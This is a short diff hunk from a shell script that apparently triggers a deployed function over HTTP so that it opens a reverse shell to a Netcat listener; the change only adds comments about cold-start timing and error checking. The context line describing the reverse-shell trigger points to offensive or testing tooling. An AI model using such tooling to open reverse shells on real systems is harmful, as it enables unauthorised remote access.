@@ -135,6 +135,8 @@ do
     # Invoke the function with an HTTP call, connecting the reverse shell to the Netcat listener.
     curl -s "$URL" -H "X-API-Key: $API_KEY" > "$TMP_SUBDIR/curl_output.txt" &
 
+    # Note: This might be an insufficient amount of time to wait for functions with cold starts.
+    # TODO: Investigate better error checking methods.
     sleep 1
 
     # Exit if the curl request terminated already.
